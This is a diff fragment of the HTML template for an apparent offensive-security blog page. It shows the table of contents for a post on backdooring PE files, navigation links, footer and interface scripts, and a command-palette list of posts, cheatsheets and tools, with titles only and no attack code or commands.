+</span><span class="font-display text-sm text-foreground/70 group-hover:text-primary transition-colors tracking-wider uppercase">Process Hollowing with Direct Syscalls</span></a><a href="/posts/installing-ca-android" class="group border border-border p-4 hover:border-foreground/30 transition-colors text-right"><span class="font-mono text-[9px] tracking-[0.3em] text-muted-foreground/50 uppercase block mb-2">
+next_entry &rarr;
+</span><span class="font-display text-sm text-foreground/70 group-hover:text-primary transition-colors tracking-wider uppercase">Installing System-level CAs on Android</span></a></nav> </div> </article> <!-- Table of Contents — sticky sidebar --> <aside class="hidden lg:block w-64 shrink-0"> <div class="sticky top-28"><div class="relative p-5"> <span class="absolute top-0 left-0 w-3 h-3 border-t border-l border-foreground/30"></span> <span class="absolute top-0 right-0 w-3 h-3 border-t border-r border-foreground/30"></span> <span class="absolute bottom-0 left-0 w-3 h-3 border-b border-l border-foreground/30"></span> <span class="absolute bottom-0 right-0 w-3 h-3 border-b border-r border-foreground/30"></span> <div class="font-mono text-[9px] tracking-[0.4em] text-muted-foreground uppercase mb-4">
+▸ table_of_contents
+</div><nav class="toc-nav space-y-0.5"><div class="toc-section" data-section="intro"><div class="flex items-center"><span class="w-4 mr-0.5 flex-shrink-0"></span><a href="#intro" class="toc-link flex-1 block py-1 font-mono text-[12px] tracking-wider text-muted-foreground hover:text-foreground/70 transition-colors duration-200" data-slug="intro" data-depth="2"><span class="text-foreground/20 mr-1.5">01</span>Intro</a></div></div><div class="toc-section" data-section="tools"><div class="flex items-center"><span class="w-4 mr-0.5 flex-shrink-0"></span><a href="#tools" class="toc-link flex-1 block py-1 font-mono text-[12px] tracking-wider text-muted-foreground hover:text-foreground/70 transition-colors duration-200" data-slug="tools" data-depth="2"><span class="text-foreground/20 mr-1.5">02</span>Tools</a></div></div><div class="toc-section" data-section="manual-proof-of-concept-poc"><div class="flex items-center"><button class="toc-toggle w-4 h-4 flex items-center justify-center text-foreground/20 hover:text-foreground/50 transition-colors mr-0.5 flex-shrink-0" data-target="manual-proof-of-concept-poc" aria-label="Toggle Manual Proof-of-Concept (POC) subheadings"><span class="toc-chevron text-[10px] font-mono transition-transform duration-200">▸</span></button><a href="#manual-proof-of-concept-poc" class="toc-link flex-1 block py-1 font-mono text-[12px] tracking-wider text-muted-foreground hover:text-foreground/70 transition-colors duration-200" data-slug="manual-proof-of-concept-poc" data-depth="2"><span class="text-foreground/20 mr-1.5">03</span>Manual Proof-of-Concept (POC)</a></div><div class="toc-children overflow-hidden transition-all duration-200" data-parent="manual-proof-of-concept-poc"><div class="toc-subsection" data-section="msfvenom-shellcode"><div class="flex items-center pl-4"><span class="w-4 mr-0.5 flex-shrink-0"></span><a href="#msfvenom-shellcode" class="toc-link flex-1 block py-0.5 font-mono text-[11px] tracking-wider text-muted-foreground/60 hover:text-foreground/60 transition-colors duration-200" data-slug="msfvenom-shellcode" data-depth="3"><span class="text-foreground/15 mr-1">—</span>msfvenom Shellcode</a></div></div><div class="toc-subsection" data-section="adding-a-new-pe-section"><div class="flex items-center pl-4"><span class="w-4 mr-0.5 flex-shrink-0"></span><a href="#adding-a-new-pe-section" class="toc-link flex-1 block py-0.5 font-mono text-[11px] tracking-wider text-muted-foreground/60 hover:text-foreground/60 transition-colors duration-200" data-slug="adding-a-new-pe-section" data-depth="3"><span class="text-foreground/15 mr-1">—</span>Adding a New PE Section</a></div></div><div class="toc-subsection" data-section="insert-shellcode-into-new-section"><div class="flex items-center pl-4"><span class="w-4 mr-0.5 flex-shrink-0"></span><a href="#insert-shellcode-into-new-section" class="toc-link flex-1 block py-0.5 font-mono text-[11px] tracking-wider text-muted-foreground/60 hover:text-foreground/60 transition-colors duration-200" data-slug="insert-shellcode-into-new-section" data-depth="3"><span class="text-foreground/15 mr-1">—</span>Insert Shellcode into New Section</a></div></div><div class="toc-subsection" data-section="manually-trigger-the-shellcode"><div class="flex items-center pl-4"><span class="w-4 mr-0.5 flex-shrink-0"></span><a href="#manually-trigger-the-shellcode" class="toc-link flex-1 block py-0.5 font-mono text-[11px] tracking-wider text-muted-foreground/60 hover:text-foreground/60 transition-colors duration-200" data-slug="manually-trigger-the-shellcode" data-depth="3"><span class="text-foreground/15 mr-1">—</span>Manually Trigger the Shellcode</a></div></div></div></div><div class="toc-section" data-section="execution-redirection"><div class="flex items-center"><button class="toc-toggle w-4 h-4 flex items-center justify-center text-foreground/20 hover:text-foreground/50 transition-colors mr-0.5 flex-shrink-0" data-target="execution-redirection" aria-label="Toggle Execution Redirection subheadings"><span class="toc-chevron text-[10px] font-mono transition-transform duration-200">▸</span></button><a href="#execution-redirection" class="toc-link flex-1 block py-1 font-mono text-[12px] tracking-wider text-muted-foreground hover:text-foreground/70 transition-colors duration-200" data-slug="execution-redirection" data-depth="2"><span class="text-foreground/20 mr-1.5">04</span>Execution Redirection</a></div><div class="toc-children overflow-hidden transition-all duration-200" data-parent="execution-redirection"><div class="toc-subsection" data-section="prepending-our-shellcode"><div class="flex items-center pl-4"><span class="w-4 mr-0.5 flex-shrink-0"></span><a href="#prepending-our-shellcode" class="toc-link flex-1 block py-0.5 font-mono text-[11px] tracking-wider text-muted-foreground/60 hover:text-foreground/60 transition-colors duration-200" data-slug="prepending-our-shellcode" data-depth="3"><span class="text-foreground/15 mr-1">—</span>Prepending our Shellcode</a></div></div><div class="toc-subsection" data-section="jumping-to-our-shellcode"><div class="flex items-center pl-4"><span class="w-4 mr-0.5 flex-shrink-0"></span><a href="#jumping-to-our-shellcode" class="toc-link flex-1 block py-0.5 font-mono text-[11px] tracking-wider text-muted-foreground/60 hover:text-foreground/60 transition-colors duration-200" data-slug="jumping-to-our-shellcode" data-depth="3"><span class="text-foreground/15 mr-1">—</span>Jumping to our Shellcode</a></div></div><div class="toc-subsection" data-section="appending-our-shellcode"><div class="flex items-center pl-4"><button class="toc-toggle w-4 h-4 flex items-center justify-center text-foreground/15 hover:text-foreground/40 transition-colors mr-0.5 flex-shrink-0" data-target="appending-our-shellcode" aria-label="Toggle Appending our Shellcode subheadings"><span class="toc-chevron text-[9px] font-mono transition-transform duration-200">▸</span></button><a href="#appending-our-shellcode" class="toc-link flex-1 block py-0.5 font-mono text-[11px] tracking-wider text-muted-foreground/60 hover:text-foreground/60 transition-colors duration-200" data-slug="appending-our-shellcode" data-depth="3"><span class="text-foreground/15 mr-1">—</span>Appending our Shellcode</a></div><div class="toc-children overflow-hidden transition-all duration-200" data-parent="appending-our-shellcode"><a href="#unblocking-the-thread" class="toc-link block py-0.5 pl-12 font-mono text-[10px] tracking-wider text-muted-foreground/40 hover:text-foreground/50 transition-colors duration-200" data-slug="unblocking-the-thread" data-depth="4"><span class="text-foreground/10 mr-1">—</span>Unblocking the Thread</a><a href="#restore-stack-frame--execution" class="toc-link block py-0.5 pl-12 font-mono text-[10px] tracking-wider text-muted-foreground/40 hover:text-foreground/50 transition-colors duration-200" data-slug="restore-stack-frame--execution" data-depth="4"><span class="text-foreground/10 mr-1">—</span>Restore Stack Frame &amp; Execution</a></div></div><div class="toc-subsection" data-section="demo"><div class="flex items-center pl-4"><span class="w-4 mr-0.5 flex-shrink-0"></span><a href="#demo" class="toc-link flex-1 block py-0.5 font-mono text-[11px] tracking-wider text-muted-foreground/60 hover:text-foreground/60 transition-colors duration-200" data-slug="demo" data-depth="3"><span class="text-foreground/15 mr-1">—</span>Demo</a></div></div></div></div><div class="toc-section" data-section="conclusion"><div class="flex items-center"><span class="w-4 mr-0.5 flex-shrink-0"></span><a href="#conclusion" class="toc-link flex-1 block py-1 font-mono text-[12px] tracking-wider text-muted-foreground hover:text-foreground/70 transition-colors duration-200" data-slug="conclusion" data-depth="2"><span class="text-foreground/20 mr-1.5">05</span>Conclusion</a></div></div></nav> </div><div class="mt-6 font-mono text-[9px] text-muted-foreground/40 tracking-widest text-center">
+◆ end_of_index
+</div></div><script type="module">function n(){const i=document.querySelectorAll(".toc-toggle"),a=new Set;i.forEach(o=>{const c=o.getAttribute("data-target");if(!c)return;const e=document.querySelector(`.toc-children[data-parent="${c}"]`);if(!e)return;e.style.maxHeight=e.scrollHeight+"px",o.addEventListener("click",()=>{const t=a.has(c),r=o.querySelector(".toc-chevron");t?(e.style.maxHeight=e.scrollHeight+"px",e.style.opacity="1",r&&(r.style.transform="rotate(90deg)"),a.delete(c)):(e.style.maxHeight="0px",e.style.opacity="0",r&&(r.style.transform="rotate(0deg)"),a.add(c))});const s=o.querySelector(".toc-chevron");s&&(s.style.transform="rotate(90deg)")});const d=document.querySelectorAll(".toc-link"),u=document.querySelectorAll("article h2, article h3, article h4"),g=new IntersectionObserver(o=>{o.forEach(c=>{if(c.isIntersecting){const e=c.target.id;d.forEach(t=>{const r=t.getAttribute("data-slug"),l=t.getAttribute("data-depth");r===e?(t.classList.add("!text-primary"),t.classList.remove("text-muted-foreground","text-muted-foreground/60","text-muted-foreground/40")):(t.classList.remove("!text-primary"),l==="2"?t.classList.add("text-muted-foreground"):l==="3"?t.classList.add("text-muted-foreground/60"):t.classList.add("text-muted-foreground/40"))});const s=document.querySelector(`.toc-link[data-slug="${e}"]`);if(s){let t=s.closest(".toc-children");for(;t;){const r=t.getAttribute("data-parent");r&&a.has(r)&&document.querySelector(`.toc-toggle[data-target="${r}"]`)?.click(),t=t.parentElement?.closest(".toc-children")}}}})},{rootMargin:"-20% 0px -60% 0px"});u.forEach(o=>g.observe(o))}n();document.addEventListener("astro:after-swap",n);</script> <!-- Post meta in sidebar --> <!-- <div class="sticky top-28 mt-6">
+            <HudCorners class="p-4">
+              <div
+                class="font-mono text-[9px] tracking-[0.4em] text-muted-foreground uppercase mb-3"
+              >
+                ▸ metadata
+              </div>
+              <div class="space-y-2">
+                <div class="flex justify-between font-mono text-[10px]">
+                  <span class="text-muted-foreground/50">category</span>
+                  <span class="text-primary uppercase">{category}</span>
+                </div>
+                <div class="flex justify-between font-mono text-[10px]">
+                  <span class="text-muted-foreground/50">date</span>
+                  <span class="text-muted-foreground"
+                    >{formatDate(pubDatetime)}</span
+                  >
+                </div>
+                <div class="flex justify-between font-mono text-[10px]">
+                  <span class="text-muted-foreground/50">read_time</span>
+                  <span class="text-muted-foreground">{readingTime}</span>
+                </div>
+              </div>
+            </HudCorners>
+          </div> --> </aside> </div> <div class="max-w-3xl mt-16"> <div class="flex items-center gap-2 "> <!-- <div class="w-2 h-2 border border-foreground/20 rotate-45"></div> --> <div class="flex-1 h-px bg-foreground/15"></div> <div class="font-mono text-[9px] tracking-[0.3em] text-muted-foreground uppercase"> <!-- {label} -->▰▰▰
+</div> <div class="flex-1 h-px bg-foreground/15"></div> <!-- <div class="w-2 h-2 border border-foreground/20 rotate-45"></div> --> </div> </div> </div> </main> <button id="mtoc-fab" class="lg:hidden fixed bottom-6 right-6 z-50 flex items-center gap-2.5 pl-3 pr-3.5 py-2 border border-border bg-background/90 backdrop-blur-md shadow-lg shadow-black/30 font-mono text-[10px] tracking-[0.2em] text-muted-foreground uppercase transition-all duration-300 hover:border-primary/40 hover:text-primary group" aria-label="Open table of contents"><span id="mtoc-progress" class="absolute top-0 left-0 h-px bg-primary transition-all duration-150 ease-out" style="width: 0%;"></span><span class="absolute top-0 left-0 w-2 h-2 border-t border-l border-foreground/20 group-hover:border-primary/30 transition-colors"></span><span class="absolute bottom-0 right-0 w-2 h-2 border-b border-r border-foreground/20 group-hover:border-primary/30 transition-colors"></span><span class="text-primary/60 text-[9px]">▸</span><span id="mtoc-fab-label" class="max-w-[140px] truncate">contents</span></button><div id="mtoc-backdrop" class="lg:hidden fixed inset-0 z-50 bg-black/60 backdrop-blur-sm opacity-0 pointer-events-none transition-opacity duration-300"></div><div id="mtoc-sheet" class="lg:hidden fixed bottom-0 left-0 right-0 z-50 translate-y-full transition-transform duration-300 ease-out"><div class="bg-background/95 backdrop-blur-md border-t border-border max-h-[70vh] flex flex-col"><div class="flex flex-col items-stretch pt-3 pb-2 px-5 border-b border-border/50 shrink-0"><div class="w-full flex items-center justify-between"><span class="font-mono text-[9px] tracking-[0.4em] text-muted-foreground uppercase">
+▸ table_of_contents
+</span><button id="mtoc-close" class="font-mono text-[10px] text-muted-foreground/50 hover:text-primary transition-colors tracking-wider" aria-label="Close table of contents">
+✕
+</button></div></div><nav class="mtoc-nav overflow-y-auto overscroll-contain px-5 py-4 space-y-0.5"><div><a href="#intro" class="mtoc-link flex items-center gap-2 py-2 font-mono text-[13px] tracking-wider text-muted-foreground hover:text-primary transition-colors duration-200" data-slug="intro" data-depth="2"><span class="text-foreground/20 text-[10px] w-5 shrink-0">01</span><span class="truncate">Intro</span></a></div><div><a href="#tools" class="mtoc-link flex items-center gap-2 py-2 font-mono text-[13px] tracking-wider text-muted-foreground hover:text-primary transition-colors duration-200" data-slug="tools" data-depth="2"><span class="text-foreground/20 text-[10px] w-5 shrink-0">02</span><span class="truncate">Tools</span></a></div><div><a href="#manual-proof-of-concept-poc" class="mtoc-link flex items-center gap-2 py-2 font-mono text-[13px] tracking-wider text-muted-foreground hover:text-primary transition-colors duration-200" data-slug="manual-proof-of-concept-poc" data-depth="2"><span class="text-foreground/20 text-[10px] w-5 shrink-0">03</span><span class="truncate">Manual Proof-of-Concept (POC)</span></a><div class="ml-5 pl-3 border-l border-border/40"><div><a href="#msfvenom-shellcode" class="mtoc-link flex items-center gap-2 py-1.5 font-mono text-[12px] tracking-wider text-muted-foreground/60 hover:text-primary/80 transition-colors duration-200" data-slug="msfvenom-shellcode" data-depth="3"><span class="text-foreground/15 text-[9px]">—</span><span class="truncate">msfvenom Shellcode</span></a></div><div><a href="#adding-a-new-pe-section" class="mtoc-link flex items-center gap-2 py-1.5 font-mono text-[12px] tracking-wider text-muted-foreground/60 hover:text-primary/80 transition-colors duration-200" data-slug="adding-a-new-pe-section" data-depth="3"><span class="text-foreground/15 text-[9px]">—</span><span class="truncate">Adding a New PE Section</span></a></div><div><a href="#insert-shellcode-into-new-section" class="mtoc-link flex items-center gap-2 py-1.5 font-mono text-[12px] tracking-wider text-muted-foreground/60 hover:text-primary/80 transition-colors duration-200" data-slug="insert-shellcode-into-new-section" data-depth="3"><span class="text-foreground/15 text-[9px]">—</span><span class="truncate">Insert Shellcode into New Section</span></a></div><div><a href="#manually-trigger-the-shellcode" class="mtoc-link flex items-center gap-2 py-1.5 font-mono text-[12px] tracking-wider text-muted-foreground/60 hover:text-primary/80 transition-colors duration-200" data-slug="manually-trigger-the-shellcode" data-depth="3"><span class="text-foreground/15 text-[9px]">—</span><span class="truncate">Manually Trigger the Shellcode</span></a></div></div></div><div><a href="#execution-redirection" class="mtoc-link flex items-center gap-2 py-2 font-mono text-[13px] tracking-wider text-muted-foreground hover:text-primary transition-colors duration-200" data-slug="execution-redirection" data-depth="2"><span class="text-foreground/20 text-[10px] w-5 shrink-0">04</span><span class="truncate">Execution Redirection</span></a><div class="ml-5 pl-3 border-l border-border/40"><div><a href="#prepending-our-shellcode" class="mtoc-link flex items-center gap-2 py-1.5 font-mono text-[12px] tracking-wider text-muted-foreground/60 hover:text-primary/80 transition-colors duration-200" data-slug="prepending-our-shellcode" data-depth="3"><span class="text-foreground/15 text-[9px]">—</span><span class="truncate">Prepending our Shellcode</span></a></div><div><a href="#jumping-to-our-shellcode" class="mtoc-link flex items-center gap-2 py-1.5 font-mono text-[12px] tracking-wider text-muted-foreground/60 hover:text-primary/80 transition-colors duration-200" data-slug="jumping-to-our-shellcode" data-depth="3"><span class="text-foreground/15 text-[9px]">—</span><span class="truncate">Jumping to our Shellcode</span></a></div><div><a href="#appending-our-shellcode" class="mtoc-link flex items-center gap-2 py-1.5 font-mono text-[12px] tracking-wider text-muted-foreground/60 hover:text-primary/80 transition-colors duration-200" data-slug="appending-our-shellcode" data-depth="3"><span class="text-foreground/15 text-[9px]">—</span><span class="truncate">Appending our Shellcode</span></a><div class="ml-4 pl-3 border-l border-border/20"><a href="#unblocking-the-thread" class="mtoc-link flex items-center gap-2 py-1 font-mono text-[11px] tracking-wider text-muted-foreground/40 hover:text-primary/70 transition-colors duration-200" data-slug="unblocking-the-thread" data-depth="4"><span class="text-foreground/10 text-[8px]">—</span><span class="truncate">Unblocking the Thread</span></a><a href="#restore-stack-frame--execution" class="mtoc-link flex items-center gap-2 py-1 font-mono text-[11px] tracking-wider text-muted-foreground/40 hover:text-primary/70 transition-colors duration-200" data-slug="restore-stack-frame--execution" data-depth="4"><span class="text-foreground/10 text-[8px]">—</span><span class="truncate">Restore Stack Frame &amp; Execution</span></a></div></div><div><a href="#demo" class="mtoc-link flex items-center gap-2 py-1.5 font-mono text-[12px] tracking-wider text-muted-foreground/60 hover:text-primary/80 transition-colors duration-200" data-slug="demo" data-depth="3"><span class="text-foreground/15 text-[9px]">—</span><span class="truncate">Demo</span></a></div></div></div><div><a href="#conclusion" class="mtoc-link flex items-center gap-2 py-2 font-mono text-[13px] tracking-wider text-muted-foreground hover:text-primary transition-colors duration-200" data-slug="conclusion" data-depth="2"><span class="text-foreground/20 text-[10px] w-5 shrink-0">05</span><span class="truncate">Conclusion</span></a></div><div class="pt-3 text-center font-mono text-[8px] text-muted-foreground/30 tracking-widest">
+◆ end_of_index
+</div></nav></div></div><script type="module">function f(){const o=document.getElementById("mtoc-fab"),a=document.getElementById("mtoc-fab-label"),d=document.getElementById("mtoc-progress"),s=document.getElementById("mtoc-backdrop"),t=document.getElementById("mtoc-sheet"),g=document.getElementById("mtoc-close");if(!o||!t||!s)return;let r=!1;function p(){r=!0,o.style.opacity="0",o.style.pointerEvents="none",s.classList.remove("opacity-0","pointer-events-none"),s.classList.add("opacity-100"),t.classList.remove("translate-y-full"),t.classList.add("translate-y-0"),document.body.style.overflow="hidden"}function l(){r=!1,s.classList.remove("opacity-100"),s.classList.add("opacity-0","pointer-events-none"),t.classList.remove("translate-y-0"),t.classList.add("translate-y-full"),document.body.style.overflow="",o.style.opacity="1",o.style.pointerEvents="auto"}o.addEventListener("click",p),s.addEventListener("click",l),g?.addEventListener("click",l),t.querySelectorAll(".mtoc-link").forEach(e=>{e.addEventListener("click",()=>{l()})}),document.addEventListener("keydown",e=>{e.key==="Escape"&&r&&l()});const v=t.querySelectorAll(".mtoc-link"),L=document.querySelectorAll("article h2, article h3, article h4"),m=document.querySelector("article");function u(){if(!m||!d)return;const e=m.getBoundingClientRect(),c=e.top+window.scrollY,n=e.height,y=window.scrollY-c,E=Math.min(100,Math.max(0,y/(n-window.innerHeight)*100));d.style.width=`${E}%`}let i="";const h=new IntersectionObserver(e=>{for(const c of e)if(c.isIntersecting){if(i=c.target.id,a){const n=c.target;a.textContent=n.textContent?.trim()||"contents"}v.forEach(n=>{n.getAttribute("data-slug")===i?n.classList.add("!text-primary"):n.classList.remove("!text-primary")}),r&&t.querySelector(`.mtoc-link[data-slug="${i}"]`)?.scrollIntoView({block:"nearest",behavior:"smooth"})}},{rootMargin:"-20% 0px -60% 0px"});L.forEach(e=>h.observe(e)),window.addEventListener("scroll",u,{passive:!0}),u()}f();document.addEventListener("astro:after-swap",f);</script>  <footer class="border-t border-border py-3 px-6"> <div class="container mx-auto"> <div class="flex flex-col md:flex-row items-start md:items-center justify-between gap-2 md:gap-4 font-mono text-[10px] tracking-[0.2em] text-muted-foreground uppercase"> <!-- Left: site identity --> <div class="flex items-center gap-3"> <span class="text-foreground/65">Shadow_Garden</span> <span class="text-foreground/18">|</span> <span>v2.077</span> <span class="text-foreground/18">|</span> <span class="text-foreground/25">&copy; 2026</span> </div> <!-- Right: live telemetry (populated by client JS) --> <div class="flex flex-col md:flex-row items-start md:items-center gap-2 md:gap-3"> <!-- Row 1 on mobile: client + status --> <div class="flex items-center gap-3"> <span>client: <span class="text-foreground/65" id="hud-browser">—</span></span> <span class="text-foreground/18">|</span> <span>status: <span class="text-green-500">●</span> <span class="text-foreground/65">online</span></span> </div> <!-- Separator (desktop only) --> <span class="hidden md:inline text-foreground/18">|</span> <!-- Row 2 on mobile: times --> <div class="flex items-center gap-3"> <span>utc: <span class="text-foreground/65" id="hud-utc">—</span></span> <span class="text-foreground/18">|</span> <span>local: <span class="text-foreground/65" id="hud-local">—</span> <span class="text-foreground/25" id="hud-tz">—</span></span> <span class="text-foreground/18">|</span> <span>unix: <span class="text-foreground/65" id="hud-unix">—</span></span> </div> </div> </div> </div> </footer> <script type="module">function c(){const t=navigator.userAgent;return t.includes("Firefox")?"Firefox":t.includes("Edg/")?"Edge":t.includes("OPR/")||t.includes("Opera")?"Opera":navigator.brave?"Brave":t.includes("Chrome")?"Chrome":t.includes("Safari")?"Safari":"Unknown"}function l(){const e=new Date().toLocaleTimeString("en-US",{timeZoneName:"short"}).split(" ");return e[e.length-1]}function u(){const t=new Date,e=document.getElementById("hud-utc"),n=document.getElementById("hud-local"),r=document.getElementById("hud-unix"),o=document.getElementById("hud-browser"),i=document.getElementById("hud-tz");e&&(e.textContent=t.toISOString().slice(11,19)),n&&(n.textContent=t.toLocaleTimeString("en-GB",{hour12:!1})),r&&(r.textContent=String(Math.floor(t.getTime()/1e3))),o&&(o.textContent=c()),i&&(i.textContent=l())}u();setInterval(u,1e3);</script> <!-- Command Palette Overlay --><div id="command-palette" class="fixed inset-0 z-50 hidden" role="dialog" aria-modal="true" aria-label="Command palette"> <!-- Backdrop --> <div id="cmd-backdrop" class="absolute inset-0 bg-background/80 backdrop-blur-sm"></div> <!-- Palette --> <div class="relative flex justify-center px-4 pt-[15vh]"> <div class="w-full max-w-lg border border-border bg-background shadow-2xl"> <!-- Input --> <div class="flex items-center border-b border-border/60 px-4"> <span class="font-mono text-[10px] text-muted-foreground/40 mr-3 shrink-0">▸</span> <input id="cmd-input" type="text" placeholder="Type a command or search..." class="flex-1 bg-transparent py-3 font-mono text-[12px] text-foreground tracking-wider placeholder:text-muted-foreground/30 focus:outline-none" autocomplete="off" spellcheck="false"> <kbd class="font-mono text-[9px] text-muted-foreground/25 border border-border/30 px-1.5 py-0.5 leading-none shrink-0">ESC</kbd> </div> <!-- Results --> <div id="cmd-results" class="max-h-[50vh] overflow-y-auto py-1"> <!-- Populated by JS --> </div> <!-- Footer --> <div class="border-t border-border/40 px-4 py-2 flex items-center gap-4"> <span class="font-mono text-[9px] text-muted-foreground/30 tracking-wider"> <kbd class="border border-border/30 px-1 py-0.5">↑↓</kbd> navigate
+</span> <span class="font-mono text-[9px] text-muted-foreground/30 tracking-wider"> <kbd class="border border-border/30 px-1 py-0.5">↵</kbd> open
+</span> <span class="font-mono text-[9px] text-muted-foreground/30 tracking-wider"> <kbd class="border border-border/30 px-1 py-0.5">esc</kbd> close
+</span> </div> </div> </div> </div> <script>(function(){const paletteData = [{"title":"Feed","description":"Home page","category":"navigation","url":"/"},{"title":"Archive","description":"All posts by year","category":"navigation","url":"/archive"},{"title":"Tags","description":"Browse by tag","category":"navigation","url":"/tags"},{"title":"Tools","description":"Utility toolkit","category":"navigation","url":"/tools"},{"title":"Cheatsheets","description":"Quick references","category":"navigation","url":"/cheatsheets"},{"title":"About","description":"Operator profile","category":"navigation","url":"/about"},{"title":"Search","description":"Full-text search","category":"navigation","url":"/search"},{"title":"CyberChef","description":"Encode, decode, hash, transform data","category":"tool","url":"/tools/cyberchef"},{"title":"Reverse Shell Generator","description":"Generate reverse shell payloads","category":"tool","url":"/tools/revshells"},{"title":"Password Generator","description":"Secure passwords and passphrases","category":"tool","url":"/tools/passgen"},{"title":"Markdown Elements Showcase","description":"A comprehensive demonstration of every supported content element — callouts, code blocks, tables, task lists, images, definition lists, and more.","category":"post","url":"/posts/markdown-elements-showcase"},{"title":"Process Hollowing with Direct Syscalls","description":"A demostration of performing process hollowing with direct syscalls in C++","category":"post","url":"/posts/process-hollowing-direct-syscalls"},{"title":"Backdooring PE Files","description":"A demostration of backdooring portable executable (PE) files by using code caves and redirecting execution flow.","category":"post","url":"/posts/backdooring-pe-files"},{"title":"Installing System-level CAs on Android","description":"A quick note about installing CAs on Android devices for proxying.","category":"post","url":"/posts/installing-ca-android"},{"title":"Gobuster","description":"Directory, DNS, and vhost brute-forcing reference. Common modes, flags, and wordlist recommendations.","category":"cheatsheet","url":"/cheatsheets/gobuster"},{"title":"Linux Commands","description":"Essential Linux commands for system administration, file management, networking, and privilege escalation.","category":"cheatsheet","url":"/cheatsheets/linux-commands"},{"title":"Nmap","description":"Network scanning and host discovery reference. Common scan types, scripts, and evasion techniques.","category":"cheatsheet","url":"/cheatsheets/nmap"},{"title":"Kubernetes Pentesting","description":"Kubernetes security assessment reference. Architecture, enumeration, RBAC abuse, pod escapes, lateral movement, and cloud pivoting.","category":"cheatsheet","url":"/cheatsheets/kubernetes"}];
 
-
-
-
-        
-  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
-    <a href="javascript: void(0)">
-      <i id="theme-icon" class="iconfont icon-moon"></i>
-    </a>
-  </div>
-
-  
-<script src="/js/colorscheme.js"></script>
-
-
-
-
-
-        
-
-      </div>
-    </div>
-  </body>
-</html>
+  window.__paletteData = paletteData;
+})();</script> <script type="module" src="/_astro/CommandPalette.astro_astro_type_script_index_0_lang.CsKQWJBv.js"></script> <script type="module">function n(){document.querySelectorAll("pre").forEach(t=>{if(t.querySelector(".code-copy-btn"))return;const e=document.createElement("button");e.className="code-copy-btn",e.textContent="▸ copy",e.addEventListener("click",()=>{const o=t.querySelector("code");o&&navigator.clipboard.writeText(o.innerText).then(()=>{e.textContent="▸ copied",e.classList.add("copied"),setTimeout(()=>{e.textContent="▸ copy",e.classList.remove("copied")},2e3)})}),t.style.position="relative",t.appendChild(e)})}n();document.addEventListener("astro:after-swap",n);</script> </body> </html>
